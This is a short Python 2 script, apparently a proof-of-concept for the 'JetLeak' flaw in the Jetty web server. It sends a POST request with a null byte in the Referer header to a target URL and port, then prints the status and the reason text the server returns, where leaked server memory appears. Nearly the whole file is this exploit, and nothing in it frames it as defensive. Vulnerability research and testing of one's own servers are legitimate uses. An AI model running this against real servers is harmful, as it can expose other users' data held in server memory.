import sys, requests

if len(sys.argv) < 3:
    print "Usage: jetleak.py {url} {port}"
    exit()

url = sys.argv[1]
port = sys.argv[2]

payload = '\x00'
header = {'Referer':payload}

r = requests.post('http://'+url+':'+port, data="", headers=header)
print r.status_code
print '\n%s'%(r.reason)



